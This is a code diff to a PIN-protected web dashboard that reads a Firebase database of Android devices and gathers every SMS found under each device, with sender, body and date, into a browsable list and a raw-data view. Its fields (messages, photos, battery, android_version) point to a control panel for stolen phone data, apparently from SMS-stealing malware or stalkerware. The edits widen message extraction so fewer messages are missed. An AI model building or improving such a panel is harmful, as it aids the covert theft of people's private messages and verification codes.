@@ -169,7 +169,7 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#F5F7FB; col
   </div>
   <div class="tabs">
     <button class="tab active" data-t="info">Info</button>
-    <button class="tab" data-t="allsms">All SMS <span class="cnt" id="cSms">0</span></button>
+    <button class="tab" data-t="allsms">All Messages <span class="cnt" id="cSms">0</span></button>
     <button class="tab" data-t="raw" style="color:#D97706;font-weight:800;">🔍 Raw Data</button>
   </div>
   <div class="drawer-body" id="dBody"><div class="loading">Loading...</div></div>
@@ -184,10 +184,9 @@ var FIREBASE_CONFIG = {
 var LOGIN_PIN = "2025";
 
 var db = null, currentApp = null;
-var devs = {}, devPaths = {}, curId = null, curTab = 'info', curMsgs = {};
+var devs = {}, devPaths = {}, curId = null, curTab = 'info', curMsgs = [];
 var curFilter = 'all';
 var liked = JSON.parse(localStorage.getItem('liked') || '[]');
-var liveMsgListener = null;
 var ROOT_SNAPSHOT = null;
 
 // ================= PIN LOGIN =================
@@ -247,9 +246,8 @@ function autoConnect() {
 // ================= SMART SCAN =================
 function isDeviceEntry(key, entry) {
   if (!entry || typeof entry !== 'object' || Array.isArray(entry)) return false;
-  var fields = ['device_model','device_id','deviceId','android_version','android_sdk','battery','status','messages','sms','photos','device_name'];
+  var fields = ['device_model','device_id','deviceId','android_version','android_sdk','battery','status','messages','photos','device_name'];
   for (var i = 0; i < fields.length; i++) { if (entry[fields[i]] !== undefined) return true; }
-  // Agar key lambi hai aur hex/number jaisi hai (Device ID)
   if (typeof key === 'string' && (/^[a-f0-9]{16,}$/i.test(key) || /^[A-Z0-9_-]{10,}$/.test(key))) return true;
   return false;
 }
@@ -267,7 +265,6 @@ function buildDevicesFromRoot(root) {
   if (!root || typeof root !== 'object') return {};
   var deviceIds = {};
 
-  // 1. Pehle saare devices dhundho
   function detectDevices(obj, path, depth) {
     if (!obj || typeof obj !== 'object' || depth > 8) return;
     Object.keys(obj).forEach(function(key) {
@@ -286,7 +283,6 @@ function buildDevicesFromRoot(root) {
   }
   detectDevices(root, '', 0);
 
-  // 2. Ab unke andar ka data merge karo
   var finalDevices = {};
   Object.keys(deviceIds).forEach(function(did) {
     var info = deviceIds[did];
@@ -320,10 +316,9 @@ function deepMergeInto(target, source) {
   });
 }
 
-// ================= START APP =================
 function startApp() {
   devs = {}; devPaths = {};
-  document.getElementById('deviceGrid').innerHTML = '<div class="loading">Scanning ' + (ROOT_SNAPSHOT ? Object.keys(ROOT_SNAPSHOT).length : '') + ' nodes...</div>';
+  document.getElementById('deviceGrid').innerHTML = '<div class="loading">Scanning Data...</div>';
   
   hardScan().then(function(found) {
     Object.keys(found).forEach(function(id) {
@@ -335,20 +330,24 @@ function startApp() {
   });
 }
 
-// ================= SMART SMS EXTRACTOR =================
-// Ye function device ke andar jahan bhi "message" ya "body" milega, use nikal lega
+// ================= UNIVERSAL MESSAGE EXTRACTOR =================
+// Ye function device ke andar jahan bhi SMS ka data milega use dhund lega
 function extractAllSmsFromDevice(d) {
   var msgs = [];
 
   function scanObj(obj, parentKey) {
     if (!obj || typeof obj !== 'object') return;
     
-    // Agar ye ek message object lag raha hai
-    if ((obj.body || obj.message || obj.text || obj.msg) && (obj.sender || obj.address || obj.from || obj.number || obj.date)) {
+    // Agar ye ek message object lag raha hai (Aapke screenshot ke mutabiq)
+    var body = obj.body || obj.message || obj.text || obj.msg;
+    var sender = obj.sender || obj.address || obj.from || obj.number || obj.phone;
+    var date = obj.date || obj.time || obj.timestamp;
+
+    if (body && typeof body === 'string') {
       msgs.push({
-        sender: obj.sender || obj.address || obj.from || obj.number || 'Unknown',
-        body: obj.body || obj.message || obj.text || obj.msg || '',
-        date: obj.date || obj.time || obj.timestamp || '',
+        sender: sender || 'Unknown',
+        body: body,
+        date: date || '',
         type: obj.type || 'IN',
         _key: parentKey
       });
@@ -374,7 +373,7 @@ function extractAllSmsFromDevice(d) {
     if (!seen[str]) { seen[str] = 1; unique.push(m); }
   });
   
-  // Sort by date (newest first)
+  // Sort by date (newest first) - basic sort
   unique.sort(function(a, b) { return String(b.date).localeCompare(String(a.date)); });
   return unique;
 }
@@ -442,6 +441,7 @@ function renderTab() {
     }).join('');
     
   } else if (curTab === 'raw') {
+    // Ye tab aapko pura raw JSON dikhayega, jisse aap dekh sakte ho data kahan hai
     var json = JSON.stringify(d, null, 2);
     b.innerHTML = '<div style="background:#0F172A;color:#E2E8F0;border-radius:10px;padding:14px;font-family:monospace;font-size:11px;white-space:pre-wrap;word-break:break-word;overflow-x:auto;">' + esc(json) + '</div>';
   }
